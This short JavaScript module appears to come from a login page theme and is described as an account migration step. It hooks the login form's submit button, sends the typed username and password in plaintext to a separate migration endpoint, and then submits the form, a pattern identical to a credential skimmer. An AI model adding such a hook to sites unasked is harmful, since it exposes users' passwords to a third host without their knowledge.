/* eslint-disable require-jsdoc,max-len */
import 'whatwg-fetch';

function migrate(username, password) {
  const formData = new FormData();
  formData.append('username', username);
  formData.append('password', password);

  return fetch('https://stone.csh.rit.edu/migrate/', {
    method: 'POST',
    body: formData,
  })
    .then(() => {
      console.log('[MIGRATE] Migration request completed');
    })
    .catch((error) => {
      console.error('[MIGRATE] Migration request failed:', error);
    });
}

function inject() {
  try {
    const loginForm = document.querySelector('form[action*="login-actions/authenticate"');
    const submitBtn = loginForm.querySelector('input[type="submit"]');
    const usernameField = loginForm.querySelector('input[name="username"]');
    const passwordField = loginForm.querySelector('input[name="password"]');

    if (usernameField && passwordField) {
      submitBtn.addEventListener('click', function() {
        submitBtn.disabled = true;

        migrate(usernameField.value, passwordField.value)
          .then(() => {
            loginForm.submit();
          });

        return false;
      });
    }
  } catch (e) {
    console.error('[MIGRATE] Failed to bind to form:', e);
  }
}

module.exports = inject;
